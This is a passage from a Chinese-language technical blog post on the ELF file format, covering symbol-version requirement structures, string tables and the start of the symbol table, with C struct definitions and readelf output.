to next verdaux entry */</span></span><br><span class="line">&#125; Elf64_Verdaux;</span><br></pre></td></tr></table></figure><ul><li><code>vda_name</code>：符号版本或依赖项名称字符串的偏移量(.dynstr)，以字节为单位。GLIBC_2.2.5、libc.so.6。</li><li><code>vda_next</code>：到下一个Elfxx_Verdaux条目的偏移量(也就是Elfxx_Verdaux结构的大小)，以字节为单位。</li></ul><h4 id="5-3-3-gnu-version-r"><a href="#5-3-3-gnu-version-r" class="headerlink" title="5.3.3 .gnu.version_r"></a>5.3.3 .gnu.version_r</h4><p>&emsp;&emsp;.gnu.version_r节存在于可执行文件和动态库(动态库也会引用其他动态库中的符号)中，表示所引用的符号的版本信息。</p><p>&emsp;&emsp;具有SHT_GNU_verneed节类型的特殊节.gnu.version_r应包含所需的符号版本定义(Required Symbol Version Definitions)。本节中的条目数应包含在动态节.dynamic的节标记为DT_VERNEEDNUM的条目中。</p><p>&emsp;&emsp;本节通过指示这些依赖项(Dependencies)所需的版本定义(Version Definitions)来补充文件的动态依赖项要求(Dynamic Dependency Requirements)。仅当依赖项包含符号版本定义时，才会在此节进行记录。</p><p>&emsp;&emsp;该节应包含一个Elfxx_Verneed结构数组，每一个Elfxx_Verneed结构可选地后跟一个Elfxx_Vernaux结构数组。</p><p>&emsp;&emsp;在.gnu.version_r中，可执行文件或动态库引用了多少个其他动态库文件则有多少个Elfxx_Verneed结构体，其他动态库文件中有多少个版本信息被引用则紧随其后就有多少个Elfxx_Vernaux结构体。</p><p>&emsp;&emsp;我们可以通过readelf命令查看此节的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -V libc-2.23.so</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x0000000000014c10  Offset: 0x014c10  Link: 5 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: ld-linux.so.2  Cnt: 3</span><br><span class="line">  0x0010:   Name: GLIBC_2.3  Flags: none  Version: 38</span><br><span class="line">  0x0020:   Name: GLIBC_PRIVATE  Flags: none  Version: 37</span><br><span class="line">  0x0030:   Name: GLIBC_2.1  Flags: none  Version: 36</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Version为符号版本的版本标识符，一个索引值。对应于Elfxx_Verdef.vd_ndx。在同一动态库中，Elfxx_Vernaux.vna_other和Elfxx_Verdef.vd_ndx的值是连续的，并且没有重复值。</p><h5 id="5-3-3-1-Elfxx-Verneed"><a href="#5-3-3-1-Elfxx-Verneed" class="headerlink" title="5.3.3.1 Elfxx_Verneed"></a>5.3.3.1 Elfxx_Verneed</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Half    vn_version;     <span class="comment">/* Version of structure */</span></span><br><span class="line">    Elf32_Half    vn_cnt;         <span class="comment">/* Number of associated aux entries */</span></span><br><span class="line">    Elf32_Word    vn_file;        <span class="comment">/* Offset of filename for this dependency */</span></span><br><span class="line">    Elf32_Word    vn_aux;         <span class="comment">/* Offset in bytes to vernaux array */</span></span><br><span class="line">    Elf32_Word    vn_next;        <span class="comment">/* Offset in bytes to next verneed entry */</span></span><br><span class="line">&#125; Elf32_Verneed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Half    vn_version;     <span class="comment">/* Version of structure */</span></span><br><span class="line">    Elf64_Half    vn_cnt;         <span class="comment">/* Number of associated aux entries */</span></span><br><span class="line">    Elf64_Word    vn_file;        <span class="comment">/* Offset of filename for this dependency */</span></span><br><span class="line">    Elf64_Word    vn_aux;         <span class="comment">/* Offset in bytes to vernaux array */</span></span><br><span class="line">    Elf64_Word    vn_next;        <span class="comment">/* Offset in bytes to next verneed entry */</span></span><br><span class="line">&#125; Elf64_Verneed;</span><br></pre></td></tr></table></figure><ul><li><code>vn_version</code>：结构的版本。此值当前设置为1，如果版本控制实现发生了不兼容的更改，则将重置该值。</li><li><code>vn_cnt</code>：与此Elfxx_Verneed结构相关联的Elfxx_Vernaux结构数组条目数。</li><li><code>vn_file</code>：此依赖项的文件名字符串的偏移量(.dynstr)，以字节为单位。此依赖项的文件名与文件中找到的.dynamic依赖项之一匹配。ld-linux-x86-64.so.2。</li><li><code>vn_aux</code>：此文件依赖项(File Dependency)所需的Elfxx_Vernaux结构版本定义数组中第1个条目距当前Elfxx_Verneed结构起始的字节偏移量(一般为Elfxx_Verneed结构的字节大小)。必须至少存在一个版本依赖项。可以存在其他版本依赖项，数量由vn_cnt值指示。</li><li><code>vn_next</code>：下一个Elfxx_Verneed结构距当前Elfxx_Verneed结构起始的偏移量(Elfxx_Verneed结构大小+vn_cnt个Elfxx_Vernaux的大小)，以字节为单位。0表示当前Elfxx_Verneed结构为最后1个。</li></ul><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-6：合法的vn_version值</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">VER_NEED_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无版本。</td></tr><tr><td style="text-align:left">VER_NEED_CURRENT</td><td style="text-align:center">1</td><td style="text-align:left">当前版本。</td></tr><tr><td style="text-align:left">VER_NEED_NUM</td><td style="text-align:center">2</td><td style="text-align:left">给定版本号。</td></tr></tbody></table><h5 id="5-3-3-2-Elfxx-Vernaux"><a href="#5-3-3-2-Elfxx-Vernaux" class="headerlink" title="5.3.3.2 Elfxx_Vernaux"></a>5.3.3.2 Elfxx_Vernaux</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word    vna_hash;       <span class="comment">/* Hash value of dependency name */</span></span><br><span class="line">    Elf32_Half    vna_flags;      <span class="comment">/* Dependency specific information */</span></span><br><span class="line">    Elf32_Half    vna_other;      <span class="comment">/* Unused */</span></span><br><span class="line">    Elf32_Word    vna_name;       <span class="comment">/* Dependency name string offset */</span></span><br><span class="line">    Elf32_Word    vna_next;       <span class="comment">/* Offset in bytes to next vernaux entry */</span></span><br><span class="line">&#125; Elf32_Vernaux;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word    vna_hash;       <span class="comment">/* Hash value of dependency name */</span></span><br><span class="line">    Elf64_Half    vna_flags;      <span class="comment">/* Dependency specific information */</span></span><br><span class="line">    Elf64_Half    vna_other;      <span class="comment">/* Unused */</span></span><br><span class="line">    Elf64_Word    vna_name;       <span class="comment">/* Dependency name string offset */</span></span><br><span class="line">    Elf64_Word    vna_next;       <span class="comment">/* Offset in bytes to next vernaux entry */</span></span><br><span class="line">&#125; Elf64_Vernaux;</span><br></pre></td></tr></table></figure><ul><li><code>vna_hash</code>：版本依赖项名称字符串的哈希值(用ELF Hash函数计算)。</li><li><code>vna_flags</code>：版本依赖信息标志(Dependency Information Flag)位掩码。通常为0。</li><li><code>vna_other</code>：在.gnu.version符号版本数组中使用的符号版本的版本标识符，一个索引值。与Elfxx_Verdef结构中的vd_ndx含义差不多。第15位控制对象是否被隐藏。如果设置了此位，对象就不能使用，静态链接器(Static Linker)将忽略该符号在对象中的存在。</li><li><code>vna_name</code>：此版本依赖项的名称字符串的偏移量(.dynstr)，以字节为单位。GLIBC_2.3。</li><li><code>vna_next</code>：从当前Elfxx_Vernaux条目开始到下一个Elfxx_Vernaux条目的偏移量(Elfxx_Vernaux结构大小)，以字节为单位。</li></ul><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-7：合法的vna_flags值</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">VER_FLG_WEAK</td><td style="text-align:center">0x2</td><td style="text-align:left">弱版本标识符。</td></tr></tbody></table><p>&emsp;&emsp;弱符号版本依赖(Weak Version Dependency)表示对弱符号版本定义(Weak Version Definition)的原始绑定。</p><h4 id="5-3-4-启动顺序-Startup-Sequence"><a href="#5-3-4-启动顺序-Startup-Sequence" class="headerlink" title="5.3.4 启动顺序(Startup Sequence)"></a>5.3.4 启动顺序(Startup Sequence)</h4><p>&emsp;&emsp;当加载一个可共享对象时，系统应分析来自加载对象的版本定义数据(Version Definition Data)，以确保它满足调用对象(Calling Object)的版本要求(Version Requirements)。此步骤称为定义测试(Definition Testing)。动态加载器(Dynamic Loader)应检索调用者的Elfxx_Verneed数组中的条目，并尝试在加载对象的.gnu.version_d表中找到匹配的符号版本定义信息(Definition Information)。</p><p>&emsp;&emsp;应该依次测试每个对象和依赖项。如果缺少符号定义并且未设置vna_flags的VER_FLG_WEAK位，则加载器将返回错误并退出。如果在Elfxx_Vernaux条目中设置了vna_flags的VER_FLG_WEAK位，加载器将发出警告并继续操作。</p><p>&emsp;&emsp;当找到被加载对象中未定义符号引用的版本时，将验证版本可用性。测试无误完成，对象应可用。</p><h4 id="5-3-5-符号解析-Symbol-Resolution"><a href="#5-3-5-符号解析-Symbol-Resolution" class="headerlink" title="5.3.5 符号解析(Symbol Resolution)"></a>5.3.5 符号解析(Symbol Resolution)</h4><p>&emsp;&emsp;当在对象中使用符号版本控制(Symbol Versioning)时，重定位将定义测试(Definition Testing)扩展了符号名称字符串的简单匹配：符号名称引用的版本字符串也应等于定义的符号版本名称。</p><p>&emsp;&emsp;在符号表中使用的索引也可以在节类型为SHT_GNU_versym的节中使用，然后使用该索引的值来获取名称数据。从Elfxx_Verneed数组中检索相应的需求对象文件名字符串(Requirement String)，同样，从Elfxx_Verdef表中检索相应的版本定义字符串(Definition String)。</p><p>&emsp;&emsp;如果设置了符号版本的版本标识符的高位(第15位)，则无法使用该对象，静态链接器(Static Linker)应忽略该符号在对象中的存在。</p><p>&emsp;&emsp;当一个带有引用(Reference)的对象和一个带有定义(Definition)的对象被链接时，以下规则将控制结果：</p><blockquote><p>1、带有引用(Reference)的对象和带有定义(Definition)的对象都使用版本控制。在这种情况下处理所有描述的匹配。如果在Elfxx_Verneed条目中vn_name元素引用的对象中找不到匹配的定义，将触发致命错误。<br>2、带有引用(Reference)的对象不使用版本控制，而带有定义(Definition)的对象使用。在这种情况下，只有索引号为1和2的符号定义将用于引用匹配，静态链接器将其标识为基本定义。在未使用静态链接器的情况下，例如在调用dlopen()时，如果没有基本定义索引的版本是唯一定义该符号的版本，则该版本是可接受的。<br>3、带有引用(Reference)的对象使用版本控制，但带有定义(Definition)的对象没有指定。在这种情况下应接受匹配的符号。如果所需符号列表中的损坏隐藏了旧式的目标文件，并导致与Elfxx_Verneed条目中的目标文件名匹配，则将触发致命错误。<br>4、带有引用(Reference)的对象和带有定义(Definition)的对象都不使用版本控制。这种情况下的行为将默认为已存在的符号规则。</p></blockquote><h3 id="5-4-Strings-Related-Sections"><a href="#5-4-Strings-Related-Sections" class="headerlink" title="5.4 Strings Related Sections"></a>5.4 Strings Related Sections</h3><p>以下是各个字符串表保存的符号的范围。</p><ul><li>.strtab：保存完整符号表.symtab中的符号名称。</li><li>.dynstr：保存动态符号表.dynsym中的符号名称。</li><li>.shstrtab：保存目标文件中拥有的节(Section)的名称。</li></ul><p>对字符串表的引用：</p><ul><li>用于保存节名(Section Name)的字符串表(.shstrtab)的节索引由ELF头的e_shstrndx字段指示。</li><li>许多带有字符串引用的节(Section)使用节头(Section Header)中的sh_link字段来给出它们使用的字符串表的节索引。</li><li>在.dynamic节中，动态字符串表(.dynstr)对于文件的偏移量位于DT_STRTAB条目中。动态字符串表(.dynstr)的大小位于DT_STRSZ条目中。</li></ul><h4 id="5-4-1-strtab"><a href="#5-4-1-strtab" class="headerlink" title="5.4.1 .strtab"></a>5.4.1 .strtab</h4><p>&emsp;&emsp;此节保存字符串，最常见的是表示与符号表(Symbol Table)条目相关联的名称的字符串。如果文件具有包含符号字符串表(Symbol String Table)的可加载段，则该段的属性将包括SHF_ALLOC位。否则，该位将不设置。此节属于SHT_STRTAB类型。</p><p>&emsp;&emsp;本节介绍默认字符串表。字符串表节(String Table Sections)保存以Null字符结尾的字符序列，通常称为字符串。目标文件(Object File)使用这些字符串来表示符号(Symbol)和节名称(Section Names)。一般通过对字符串的首个字母在字符串表中的下标来索引字符串。字符串表的首尾字节都是Null，以确保所有字符串以Null终止。此外，索引为0的字符串要么没有名字(No Name)，要么就是名字为空(Null Name)，具体取决于上下文。字符串表也可以为空，相应的，它的节头的sh_size成员将为0。非0索引对于空字符串表无效。</p><p>&emsp;&emsp;节头的sh_name成员的值是节头字符串表节(.shstrtab)中内容距节头字符串表节起始的偏移量/索引值(以字节为单位)，节头字符串表节(.shstrtab)在节头表中的索引由ELF头的e_shstrndx成员指定。下图显示了一个包含25个字节的字符串表以及与各种索引关联的字符串。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_5-4：String_Table_Example.png" alt="Figure 5-4：String Table Example"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 5-4：String Table Example</p><p>&emsp;&emsp;该字符串表中的字符串与索引的关系如下：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-8：String Table Indexes</p><table><thead><tr><th style="text-align:center">Index</th><th style="text-align:left">String</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:left">none</td></tr><tr><td style="text-align:center">1</td><td style="text-align:left">name.</td></tr><tr><td style="text-align:center">7</td><td style="text-align:left">Variable</td></tr><tr><td style="text-align:center">11</td><td style="text-align:left">able</td></tr><tr><td style="text-align:center">16</td><td style="text-align:left">able</td></tr><tr><td style="text-align:center">24</td><td style="text-align:left">null string</td></tr></tbody></table><p>如示例所示：</p><ul><li>字符串表索引可以引用该节中的任何字节。</li><li>一个字符串可能出现多次。</li><li>可以存在对子字符串的引用。</li><li>同一个字符串可以被引用多次。</li><li>字符串表中也可以存在未引用的字符串。</li></ul><p>我们可以使用readelf对.strtab表的内容进行查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -p 30 hash</span><br><span class="line">$ readelf -p .strtab hash</span><br><span class="line"></span><br><span class="line">String dump of section &apos;.strtab&apos;:</span><br><span class="line">  [     1]  crtstuff.c</span><br><span class="line">  [     c]  __JCR_LIST__</span><br><span class="line">  [    19]  deregister_tm_clones</span><br><span class="line">  [    2e]  __do_global_dtors_aux</span><br><span class="line">  [    44]  completed.7594</span><br><span class="line">  [    53]  __do_global_dtors_aux_fini_array_entry</span><br><span class="line">  [    7a]  frame_dummy</span><br><span class="line">  [    86]  __frame_dummy_init_array_entry</span><br><span class="line">  [    a5]  hash.c</span><br><span class="line">  [    ac]  __FRAME_END__</span><br><span class="line">  [    ba]  __JCR_END__</span><br><span class="line">  [    c6]  __init_array_end</span><br><span class="line">  [    d7]  _DYNAMIC</span><br><span class="line">  [    e0]  __init_array_start</span><br><span class="line">  [    f3]  __GNU_EH_FRAME_HDR</span><br><span class="line">  [   106]  _GLOBAL_OFFSET_TABLE_</span><br><span class="line">  [   11c]  __libc_csu_fini</span><br><span class="line">  [   12c]  _ITM_deregisterTMCloneTable</span><br><span class="line">  [   148]  _edata</span><br><span class="line">  [   14f]  printf@@GLIBC_2.2.5</span><br><span class="line">  [   163]  __libc_start_main@@GLIBC_2.2.5</span><br><span class="line">  [   182]  __data_start</span><br><span class="line">  [   18f]  __gmon_start__</span><br><span class="line">  [   19e]  __dso_handle</span><br><span class="line">  [   1ab]  _IO_stdin_used</span><br><span class="line">  [   1ba]  __libc_csu_init</span><br><span class="line">  [   1ca]  __bss_start</span><br><span class="line">  [   1d6]  main</span><br><span class="line">  [   1db]  _Jv_RegisterClasses</span><br><span class="line">  [   1ef]  __TMC_END__</span><br><span class="line">  [   1fb]  _ITM_registerTMCloneTable</span><br><span class="line">  [   215]  elf_hash</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这个节将会在使用GNU Binutils的strip命令对目标文件去除符号之后被丢弃。同样被丢弃的还有.symtab。通过去除符号，可以减小可执行文件和共享库文件的大小，也可以增加逆向的难度。</p><h4 id="5-4-2-dynstr"><a href="#5-4-2-dynstr" class="headerlink" title="5.4.2 .dynstr"></a>5.4.2 .dynstr</h4><p>&emsp;&emsp;此节包含动态链接(Dynamic Linking)所需的字符串，最常见的是表示与符号表条目关联的名称的字符串。此节属于SHT_STRTAB类型。使用的属性类型是SHF_ALLOC。此节的结构与.strtab节类似。</p><p>&emsp;&emsp;我们可以使用readelf对.dynstr表的内容进行查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -p .dynstr libc-2.23.so </span><br><span class="line"></span><br><span class="line">String dump of section &apos;.dynstr&apos;:</span><br><span class="line">  [     1]  xdr_u_long</span><br><span class="line">  [     c]  __wctomb_chk</span><br><span class="line">  [    19]  getmntent</span><br><span class="line">  [    23]  __freelocale</span><br><span class="line">  [    30]  xdr_void</span><br><span class="line">  [    39]  __rawmemchr</span><br><span class="line">  [    45]  _IO_vsprintf</span><br><span class="line">  [    52]  getutent</span><br><span class="line">  [    5b]  rcmd_af</span><br><span class="line">  [    63]  setitimer</span><br><span class="line">  [    6d]  argp_usage</span><br><span class="line">  [    78]  wcstoimax</span><br><span class="line">  [    82]  execvp</span><br><span class="line">  [    89]  pthread_setcancelstate</span><br><span class="line">  [    a0]  _IO_wfile_underflow</span><br><span class="line">  [    b4]  __res_maybe_init</span><br><span class="line">  [    c5]  setservent</span><br><span class="line">  [    d0]  setuid</span><br><span class="line">  [    d7]  __wcsncat_chk</span><br><span class="line">  [    e5]  argp_help</span><br><span class="line">  [    ef]  __strtok_r</span><br><span class="line">[...]</span><br><span class="line">  [  5e0d]  GLIBC_2.18</span><br><span class="line">  [  5e18]  GLIBC_2.22</span><br><span class="line">  [  5e23]  GLIBC_2.23</span><br><span class="line">  [  5e2e]  GLIBC_PRIVATE</span><br><span class="line">  [  5e3c]  GCC_3.0</span><br></pre></td></tr></table></figure><h4 id="5-4-3-shstrtab"><a href="#5-4-3-shstrtab" class="headerlink" title="5.4.3 .shstrtab"></a>5.4.3 .shstrtab</h4><p>&emsp;&emsp;此节包含节名称(Section Names)。此节属于SHT_STRTAB类型。不使用任何属性类型。此节的结构与.strtab节类似。</p><p>&emsp;&emsp;我们可以使用readelf对.shstrtab表的内容进行查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -p .shstrtab libc-2.23.so </span><br><span class="line"></span><br><span class="line">String dump of section &apos;.shstrtab&apos;:</span><br><span class="line">  [     1]  .shstrtab</span><br><span class="line">  [     b]  .note.gnu.build-id</span><br><span class="line">  [    1e]  .note.ABI-tag</span><br><span class="line">  [    2c]  .gnu.hash</span><br><span class="line">  [    36]  .dynsym</span><br><span class="line">  [    3e]  .dynstr</span><br><span class="line">  [    46]  .gnu.version</span><br><span class="line">  [    53]  .gnu.version_d</span><br><span class="line">  [    62]  .gnu.version_r</span><br><span class="line">  [    71]  .rel.dyn</span><br><span class="line">  [    7a]  .rel.plt</span><br><span class="line">  [    83]  .plt.got</span><br><span class="line">  [    8c]  .text</span><br><span class="line">  [    92]  __libc_freeres_fn</span><br><span class="line">  [    a4]  __libc_thread_freeres_fn</span><br><span class="line">  [    bd]  .rodata</span><br><span class="line">  [    c5]  .stapsdt.base</span><br><span class="line">  [    d3]  .interp</span><br><span class="line">  [    db]  .eh_frame_hdr</span><br><span class="line">  [    e9]  .eh_frame</span><br><span class="line">  [    f3]  .gcc_except_table</span><br><span class="line">  [   105]  .tdata</span><br><span class="line">  [   10c]  .tbss</span><br><span class="line">  [   112]  .init_array</span><br><span class="line">  [   11e]  __libc_subfreeres</span><br><span class="line">  [   130]  __libc_atexit</span><br><span class="line">  [   13e]  __libc_thread_subfreeres</span><br><span class="line">  [   157]  .data.rel.ro</span><br><span class="line">  [   164]  .dynamic</span><br><span class="line">  [   16d]  .got.plt</span><br><span class="line">  [   176]  .data</span><br><span class="line">  [   17c]  .bss</span><br><span class="line">  [   181]  .note.stapsdt</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="5-5-Symbols-Related-Sections"><a href="#5-5-Symbols-Related-Sections" class="headerlink" title="5.5 Symbols Related Sections"></a>5.5 Symbols Related Sections</h3><p>&emsp;&emsp;每个目标文件都会有一个符号表，熟悉编译原理的就会知道，在编译程序时，必须有相应的结构来管理程序中的符号以便于对函数和变量进行重定位。</p><p>&emsp;&emsp;此外，链接本质就是把多个不同的目标文件相互“粘”在一起，实际上，目标文件相互粘合是目标文件之间对地址的引用，即函数和变量的地址的相互引用。而在粘合的过程中，符号就是其中的粘合剂。</p><p>&emsp;&emsp;目标文件中的符号表包含了一些通用的符号，这部分信息在进行了strip操作后就会消失。包括变量名和函数名。</p><h4 id="5-5-1-symtab"><a href="#5-5-1-symtab" class="headerlink" title="5.5.1 .symtab"></a>5.5.1 .symtab</h4><p>&emsp;&emsp;目标文件的符号表包含定位(Locate)和重定位(Relocate)程序的符号的定义(Definitions)和引用(References)时所需的信息。符号表索引是该数组的下标。索引0既指定表中的第一个条目，又用作未定义符号索引。本节稍后将指定初始条目的内容。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-9：Index 0 of Symbol Table</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">STN_UNDEF</td><td style="text-align:center">0</td></tr></tbody></table><p>&emsp;&emsp;符号表表项具有以下格式(这里需要注意一点，Elf32_Sym和Elf64_Sym结构体成员的顺序不同)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word      st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr      st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word      st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section   st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word      st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf64_Section   st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">    Elf64_Addr      st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf64_Xword     st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>各个字段的含义如下：</p><ul><li><code>st_name</code>：如果该值非零，该成员保存该符号的符号名字符串在相应字符串表中的节偏移量/索引，字符串表保存符号名称的字符串。否则，符号表项没有名称。注：外部C符号在C语言和目标文件的符号表中具有相同的名称。</li><li><code>st_value</code>：该成员给出相关符号的值。根据上下文，这可能是绝对值、地址等。详情见下方。</li><li><code>st_size</code>：许多符号都有相应的大小。例如，数据对象的大小是对象中包含的字节数。如果符号没有大小或大小未知，则该成员为0。</li><li><code>st_info</code>：该成员指定符号的类型(Symbol Type)和绑定属性(Binding Attributes)。</li><li><code>st_other</code>：该成员定义了符号的可见性(Visibility)。</li><li><code>st_shndx</code>：每个符号表条目都被“定义”为与某个节相关，该成员保存相关节的节头表索引。如Table 4-1和相关文本所述，一些节索引具有特殊含义。</li></ul><p>&emsp;&emsp;其中，符号表中索引为0(STN_UNDEF)的表项存储了符号表的一个元素，同时这个元素也相对比较特殊，作为所有未定义符号的索引，具体如下：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-10：Symbol Table Entry: Index 0</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">st_name</td><td style="text-align:left">0</td><td style="text-align:left">无符号名字符串。</td></tr><tr><td style="text-align:left">st_value</td><td style="text-align:left">0</td><td style="text-align:left">无符号值。</td></tr><tr><td style="text-align:left">st_size</td><td style="text-align:left">0</td><td style="text-align:left">无符号大小。</td></tr><tr><td style="text-align:left">st_info</td><td style="text-align:left">0</td><td style="text-align:left">无符号类型，本地绑定。</td></tr><tr><td style="text-align:left">st_other</td><td style="text-align:left">0</td><td style="text-align:left">默认符号可见性规则。</td></tr><tr><td style="text-align:left">st_shndx</td><td style="text-align:left">SHN_UNDEF</td><td style="text-align:left">无对应的节。</td></tr></tbody></table><p>&emsp;&emsp;我们可以使用readelf对.symtab表的内容进行查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 